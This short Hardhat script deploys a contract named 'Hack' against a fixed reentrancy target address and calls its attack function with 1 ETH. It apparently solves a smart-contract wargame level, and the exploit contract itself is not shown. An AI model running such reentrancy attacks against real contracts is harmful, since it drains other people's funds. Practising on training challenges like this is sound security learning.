const { ethers } = require("hardhat")
const hre = require("hardhat")

const instanceAddress = "0x503d17146931Fb087634036d11585b66340806F5"

async function main() {
    const ReentrancyAttack = await ethers.getContractFactory("Hack")
    // send more than 0,001ETH (Reentrace's contract balance) when deploying
    const reentrancyAttack = await ReentrancyAttack.deploy(instanceAddress)

    await reentrancyAttack.deployed()

    console.log(`Exploit deployed to: ${reentrancyAttack.address}`)

    console.log("---------------------------------------")
    const amountDeposit = ethers.utils.parseEther("1")

    await reentrancyAttack.attack({
        value: amountDeposit,
    })

    console.log("HACKED...")
}

main().catch((error) => {
    console.error(error)
    process.exitCode = 1
})
